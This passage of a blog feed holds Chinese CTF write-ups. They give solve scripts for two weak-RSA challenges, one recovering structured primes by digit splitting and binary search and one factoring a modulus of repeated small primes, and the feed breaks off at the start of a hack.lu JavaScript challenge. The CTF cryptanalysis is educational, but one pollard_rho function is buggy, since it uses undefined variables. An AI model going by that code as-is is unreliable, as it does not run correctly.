    
    
    
    <entry>
      <title>RSA整理</title>
      <link href="/2019/11/13/crypto/rsa-zheng-li/"/>
      <url>/2019/11/13/crypto/rsa-zheng-li/</url>
      
        <content type="html"><![CDATA[<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="百越杯math"><a href="#百越杯math" class="headerlink" title="百越杯math"></a>百越杯math</h3><p>题目，给了n1，n，和密文flag，公钥e。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime<span class="token keyword">from</span> flag <span class="token keyword">import</span> flagflag <span class="token operator">=</span> s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>a <span class="token operator">=</span> getRandomRange<span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">499</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> getRandomRange<span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">499</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> a<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>bq <span class="token operator">=</span> b<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token keyword">print</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> getRandomInteger<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>p <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>p<span class="token operator">+</span>c<span class="token punctuation">)</span>q <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>q<span class="token operator">+</span>c<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">print</span> nflag <span class="token operator">=</span> pow<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> flag</code></pre><p>可以通过n1，求p1，q1。</p><p>其中先求从n1中分解出a*b</p><pre class=" language-python"><code class="language-python">n1<span class="token operator">=</span>a<span class="token operator">*</span>b<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token operator">*</span>a<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token operator">*</span>b<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token operator">*</span>b</code></pre><p>n1一共有2000位，前500位和后500位拼接可以得到a*b，考虑到进位有三种可能，都测试一下，最后得到a，b。从而求出p1，q1</p><pre class=" language-python"><code class="language-python">n<span class="token operator">=</span><span class="token number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span>ab<span class="token operator">=</span><span class="token number">3729015316596929817074776748798776710660495632759045930962331088443664586738540522683692382643976040223218219904704229874097094111475740275803533822735298188434519430418307941051290472051619700245959864365980238371813769897455787028036658558639238547023559777767259336078874439837569089854697180138882119423477537395269813433588599169471494997467948256460081576637738889503780922216880055422261994024085371796563714989776514977095699150345999578688999546152033298078756696776724344575445038055316615519829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span>a2b2<span class="token operator">=</span>n<span class="token operator">-</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#a**2+b**2</span><span class="token comment" spellcheck="true"># print a2b2</span>t<span class="token operator">=</span>a2b2<span class="token operator">/</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print t #len:1001</span>t1<span class="token operator">=</span>t<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#(a+b)**2</span><span class="token keyword">print</span> <span class="token string">"(a+b)**2:"</span><span class="token punctuation">,</span>t1 <span class="token comment" spellcheck="true">#(a+b)**2 len:1001</span>t2<span class="token operator">=</span>t1<span class="token number">-4</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#(a-b)**2</span><span class="token keyword">print</span> <span class="token string">"(a-b)**2:"</span><span class="token punctuation">,</span>t2 <span class="token comment" spellcheck="true">#(a-b)**2 len:1001</span>tt1<span class="token operator">=</span>iroot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"(a+b):"</span><span class="token punctuation">,</span>tt1 <span class="token comment" spellcheck="true">#(a+b)</span>tt2<span class="token operator">=</span>iroot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"(a-b):"</span><span class="token punctuation">,</span>tt2 <span class="token comment" spellcheck="true">#(a-b)</span>b<span class="token operator">=</span><span class="token punctuation">(</span>tt1<span class="token operator">-</span>tt2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>a<span class="token operator">=</span>tt1<span class="token operator">-</span>b<span class="token keyword">print</span> <span class="token string">"b:"</span><span class="token punctuation">,</span>b<span class="token keyword">print</span> <span class="token string">"a:"</span><span class="token punctuation">,</span>ap <span class="token operator">=</span> a<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>bq <span class="token operator">=</span> b<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token operator">+</span>a</code></pre><p>c是一个20位的数，通过二分法爆破，最后用p1,q1,c得到p,q</p><pre class=" language-python"><code class="language-python">c1<span class="token operator">=</span><span class="token number">223544898878048947880330262959</span>c2<span class="token operator">=</span><span class="token number">253544898878048947880330262959</span><span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c1<span class="token operator">+</span>c2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>        p<span class="token operator">=</span><span class="token number">7724533844747394899349412339828776507222531964570563673657731510573489841606241899431933799753548435100266998960524464930676080336780106550530528156652698098697939066388001862335776045810162308820460444103489118460484370360374490252853308767775503254680817659918620827189505621697773686635428578989940339364335258812085155863395156211658749886912345720117817903261544675017614190883555615406264212068632733125247667940798492107549869436238502679059874386631718816248039209963903483751137734845937488448274956023820422762712035969893644873130710756898125766905141097162634971719675541937272502083073371337486398745408176446378960949530179254458951059359334312627484778865569189174918141307780733163571737089532375061096755773211249431675122668604315339846808046876666178988233969079030213364891617388431952560954924381712484465088395641644984415182477503907081799371321500277312785408279987356973984610573989890126043071505051543960194615504894391665369281429295377569609839082507454042128770271891415</span>    q<span class="token operator">=</span><span class="token number">4827495602382042276271203596989364487313071075689812576690514109716263497171967554193727250208307337133748639874540817644637896094953017925445895105935933431262748477886556918917491814130778073316357173708953237506109675577321124943167512266860431533984680804687666617898823396907903021336489161738843195256095492438171248446508839564164498441518247750390708179937132150027731278540827998735697398461057398989012604307150505154396019461550489439166536928142929537756960983908250745404212877027189141577245338447473948993494123398287765072225319645705636736577315105734898416062418994319337997535484351002669989605244649306760803367801065505305281566526980986979390663880018623357760458101623088204604441034891184604843703603744902528533087677755032546808176599186208271895056216977736866354285789899403393643352588120851558633951562116587498869123457201178179032615446750176141908835556154062642120686327331252476679407984921075498694362385026790598743866317188162480392099639034837511377348459374884</span>    p <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>p<span class="token operator">+</span>c<span class="token punctuation">)</span>    q <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>q<span class="token operator">+</span>c<span class="token punctuation">)</span>    n2<span class="token operator">=</span>p<span class="token operator">*</span>q    <span class="token keyword">if</span> n2<span class="token operator">></span>n<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"c1:"</span><span class="token punctuation">,</span>c1        <span class="token keyword">print</span> <span class="token string">"c2:"</span><span class="token punctuation">,</span>c        fun<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>c<span class="token punctuation">)</span>    <span class="token keyword">elif</span> n2<span class="token operator">&lt;</span>n<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"c1:"</span><span class="token punctuation">,</span>c        <span class="token keyword">print</span> <span class="token string">"c2:"</span><span class="token punctuation">,</span>c2        fun<span class="token punctuation">(</span>c<span class="token punctuation">,</span>c2<span class="token punctuation">)</span>    <span class="token keyword">elif</span> n2<span class="token operator">==</span>n<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"p:"</span><span class="token punctuation">,</span>p        <span class="token keyword">print</span> <span class="token string">"q:"</span><span class="token punctuation">,</span>q        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"error"</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fun<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span></code></pre><p>最后解密得到flag</p><pre class=" language-python"><code class="language-python">c<span class="token operator">=</span><span class="token number">37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span>N<span class="token operator">=</span>p<span class="token operator">*</span>qphin <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"d"</span><span class="token punctuation">,</span>d<span class="token comment" spellcheck="true">#137443939677632407697822373106774146170757453506013404320961</span>flag <span class="token operator">=</span> powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><h3 id="unctf-babyrsa"><a href="#unctf-babyrsa" class="headerlink" title="unctf babyrsa"></a>unctf babyrsa</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag<span class="token operator">=</span><span class="token string">'XXXXXXXXXX'</span>e<span class="token operator">=</span><span class="token number">0x10001</span> <span class="token comment" spellcheck="true">#65537</span>n<span class="token operator">=</span><span class="token number">3464115689260819392935656139231271022088014497600959975252672820761470484618617542699739764705620767566046150296286140279466041905437740736319886548924058066340624280173573039937440574809212831672936265975209972857747738693288788052694888593629820783280181774594890101819911390468376042288685444703477639361249422054925155575158181408046447773183467474182159096249846479461475003039637685547191529769071424947165685996675043741359728960138725130116665515880652680244470002603320184043266997163009799067135481330853926800023087208636366543210276325733789567957712475079676808820490428973148590780103404729397985019089646026534758042652163974037179260930147000267787012874887703048185189387666199961350969478997330352491403611551096779887936063702892671572230523920277869824082318417366635732798078805070773662305098133013800559413976855639167085996705265872418286939474978058429877355305699191892248323534097124680592084808397263288943661630283254265898940430505371463275516870915261799702701453110383723660477322192658118815861974573497885759332587457883589126213868868281682733732394640188383458580555618181208722172011645063817887462511925363883111475043389367021569982583145912277082528397480756465818166640691294267829613428532584923122279261412957652411789780285394451850006055483598427256129336822790446219260722224551892755568723667049099823707012236618539013908897459508493477299241358343681962043777720375898238069411747593247677719659288861028038609681592049271388766040068274682329498410270047730060645409396168652996740411436504098243588534151795927613112273405281530700440843961363083171583053608594479571127638861391879160062136043924515492933057094406001740725150570943724333872057035272515676895138632004436149126542560186729495087753846670118167613304943153665660470977150177815354160112481310498255965933157902965011317272734556307544837058247794721427834401390455487872367113056168812990496943458920406382650794656884209032284257748450399719067686010156664485086500184078244358783696803659745365860507822269113477617988541658390715640119076036723560146145256418191555730429</span>m<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(c)</span><span class="token keyword">assert</span> c<span class="token operator">==</span><span class="token number">1348180992713820685594359831085361247035354818267759694375727771380213764105201303900290589048476671838784929302557807429509301123621642066527762448168417430350203900517746161928291953862336621873868684964993481406952303460424386080800907869577832154132021624995347121475139439850224598911049824567475034545196149320206620924509546294914370633958171840525667753751028800452370972967842349036965813468093121305475860652163573748880159896028384459277781803606279654121781761535513864212749202340439422384362197321739535686506006254445152569135807838677803047115947240251817017395748631234023225248868640103807357800695487118067385969130665294711887439861169737031598274672286881054564295019370600398079829687943670066246766386800967129670975899437309257181151390273864539453238400821713398980792443187238155205199387468000884390778225928491109565539772444103430764411852162036780535068932010631521096301305200494731040799554079996593223419379540630567412342494359961515157700054387356888773321804429041668331430841954949061238002355270616266853430676140296078177898764114420743905073496118755793091902224563802923183897542996809393707165837427396760691616506592877656939455806776333105152244073459704842848097376929745632888315642056267589901527329593161439752243318158600747713335265681764274061086952626629147275106502354039293870614872849851780761537660716667003562253735923584765118319171207551032289722689929226947535724389015974764265109970513715649126340709399701638880824570967389428525179746112494690443526404899052482884526335312491500994658519105204100875596292743155076199283666094556235485722975240358390560161706163569618302627055238860096406627340558428533728688904747040262153892623865784320600845613247625784683300197845026108394831724602330903266980995146046956218083954561639114586880305451066793209385702886944430548686040360906088479432852330611586273784509957389880104225534635731572089138568407411433675077699382999593384336070450058824669351046095205147266720901917218217564113964074957585348227506587531149811564371155522575778721899999227020238022970334707476977210019</span></code></pre><p>猜测n是由若干个小素数的乘积而来，于是利用Pollard’s ρ algorithm分解这个n</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">%</span>b    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">mapx</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>n    <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">pollard_rho</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        x1 <span class="token operator">=</span> mapx<span class="token punctuation">(</span>x1<span class="token punctuation">)</span>        x2 <span class="token operator">=</span> mapx<span class="token punctuation">(</span>mapx<span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a <span class="token operator">-</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pn<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> pollard_rho<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> p    n <span class="token operator">=</span> n <span class="token operator">/</span> p</code></pre><p>但其实有前面6个<code>740160703366837</code>大概已经是够了，<code>740160703366837</code>的6次方大概有90位，而如果flag是md5值得话，长度是32+6。由76位十六进制表示，最大由92位十进制表示（显然是不可能的，这个时候已经不是可打印字符了）所以90位作为n应该已经是够了。（再不济就再等一会儿,多出来几个就好了）</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># flag='XXXXXXXXXX'</span>e<span class="token operator">=</span><span class="token number">0x10001</span>n<span class="token operator">=</span><span class="token number">3464115689260819392935656139231271022088014497600959975252672820761470484618617542699739764705620767566046150296286140279466041905437740736319886548924058066340624280173573039937440574809212831672936265975209972857747738693288788052694888593629820783280181774594890101819911390468376042288685444703477639361249422054925155575158181408046447773183467474182159096249846479461475003039637685547191529769071424947165685996675043741359728960138725130116665515880652680244470002603320184043266997163009799067135481330853926800023087208636366543210276325733789567957712475079676808820490428973148590780103404729397985019089646026534758042652163974037179260930147000267787012874887703048185189387666199961350969478997330352491403611551096779887936063702892671572230523920277869824082318417366635732798078805070773662305098133013800559413976855639167085996705265872418286939474978058429877355305699191892248323534097124680592084808397263288943661630283254265898940430505371463275516870915261799702701453110383723660477322192658118815861974573497885759332587457883589126213868868281682733732394640188383458580555618181208722172011645063817887462511925363883111475043389367021569982583145912277082528397480756465818166640691294267829613428532584923122279261412957652411789780285394451850006055483598427256129336822790446219260722224551892755568723667049099823707012236618539013908897459508493477299241358343681962043777720375898238069411747593247677719659288861028038609681592049271388766040068274682329498410270047730060645409396168652996740411436504098243588534151795927613112273405281530700440843961363083171583053608594479571127638861391879160062136043924515492933057094406001740725150570943724333872057035272515676895138632004436149126542560186729495087753846670118167613304943153665660470977150177815354160112481310498255965933157902965011317272734556307544837058247794721427834401390455487872367113056168812990496943458920406382650794656884209032284257748450399719067686010156664485086500184078244358783696803659745365860507822269113477617988541658390715640119076036723560146145256418191555730429</span><span class="token comment" spellcheck="true"># m=bytes_to_long(flag)</span><span class="token comment" spellcheck="true"># c=pow(m,e,n)</span><span class="token comment" spellcheck="true"># print(c)</span>c <span class="token operator">=</span><span class="token number">1348180992713820685594359831085361247035354818267759694375727771380213764105201303900290589048476671838784929302557807429509301123621642066527762448168417430350203900517746161928291953862336621873868684964993481406952303460424386080800907869577832154132021624995347121475139439850224598911049824567475034545196149320206620924509546294914370633958171840525667753751028800452370972967842349036965813468093121305475860652163573748880159896028384459277781803606279654121781761535513864212749202340439422384362197321739535686506006254445152569135807838677803047115947240251817017395748631234023225248868640103807357800695487118067385969130665294711887439861169737031598274672286881054564295019370600398079829687943670066246766386800967129670975899437309257181151390273864539453238400821713398980792443187238155205199387468000884390778225928491109565539772444103430764411852162036780535068932010631521096301305200494731040799554079996593223419379540630567412342494359961515157700054387356888773321804429041668331430841954949061238002355270616266853430676140296078177898764114420743905073496118755793091902224563802923183897542996809393707165837427396760691616506592877656939455806776333105152244073459704842848097376929745632888315642056267589901527329593161439752243318158600747713335265681764274061086952626629147275106502354039293870614872849851780761537660716667003562253735923584765118319171207551032289722689929226947535724389015974764265109970513715649126340709399701638880824570967389428525179746112494690443526404899052482884526335312491500994658519105204100875596292743155076199283666094556235485722975240358390560161706163569618302627055238860096406627340558428533728688904747040262153892623865784320600845613247625784683300197845026108394831724602330903266980995146046956218083954561639114586880305451066793209385702886944430548686040360906088479432852330611586273784509957389880104225534635731572089138568407411433675077699382999593384336070450058824669351046095205147266720901917218217564113964074957585348227506587531149811564371155522575778721899999227020238022970334707476977210019</span><span class="token keyword">def</span> <span class="token function">PollardRho_p_1</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> i <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pow<span class="token punctuation">(</span>a<span class="token punctuation">,</span> i<span class="token punctuation">,</span> N<span class="token punctuation">)</span>        d <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> d        i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># print(PollardRho_p_1(1,n))</span>p <span class="token operator">=</span> <span class="token number">1043705605371301</span>n1 <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">7</span><span class="token comment" spellcheck="true"># print n1</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">**</span><span class="token number">6</span><span class="token punctuation">)</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># c = c % n1</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flag{G0oDJ0b_S0_SimPle_ChaMd5}</span></code></pre><p>这里相当于我们直接把原题的n给纂改了</p><p>首先可以证明 M=C^d^ mod N </p><p>首先，看到这里要求m&lt;n，所以这里n_new大于m即可</p><p>其次，由于n_new | n，所以 c % n_new == pow(m ,e ,n_new)</p><p>推理如下</p><pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> n_new <span class="token operator">*</span> x          c <span class="token operator">=</span> m<span class="token operator">^</span>e <span class="token operator">%</span> n        m<span class="token operator">^</span>e <span class="token operator">=</span> k<span class="token operator">*</span>n <span class="token operator">+</span> c        m<span class="token operator">^</span>e <span class="token operator">=</span> k<span class="token operator">*</span>n_new<span class="token operator">*</span>x <span class="token operator">+</span> cm<span class="token operator">^</span>e <span class="token operator">%</span> n_new <span class="token operator">=</span> c <span class="token operator">%</span> n_new</code></pre><p>所以只要新的N满足，m&lt;N, m^e ≡ c (mod N)，并且gcd(e,phi(N))=1，即可逆向求出m来。</p><p><a href="https://xz.aliyun.com/t/6703#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6703#toc-1</a></p><p><a href="http://www.hghhgghhg.top/2019/10/28/UNCTFWP/#simple-rsa" target="_blank" rel="noopener">http://www.hghhgghhg.top/2019/10/28/UNCTFWP/#simple-rsa</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hack.lu</title>
      <link href="/2019/11/07/writeup/hacklu/"/>
      <url>/2019/11/07/writeup/hacklu/</url>
      
        <content type="html"><![CDATA[<h2 id="Car-repair"><a href="#Car-repair" class="headerlink" title="Car repair"></a>Car repair</h2><p>js题目，car.class.js定义car类的方法，util.js调用函数</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//car.class.js</span><span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> model<span class="token punctuation">,</span> color<span class="token punctuation">,</span> pic<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type        <span class="token keyword">this</span><span class="token punctuation">.</span>model <span class="token operator">=</span> model        <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color        <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key        <span class="token keyword">this</span><span class="token punctuation">.</span>pic <span class="token operator">=</span> pic        <span class="token keyword">let</span> started <span class="token operator">=</span> <span class="token boolean">false</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            started <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isStarted <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> started        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">powerOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token 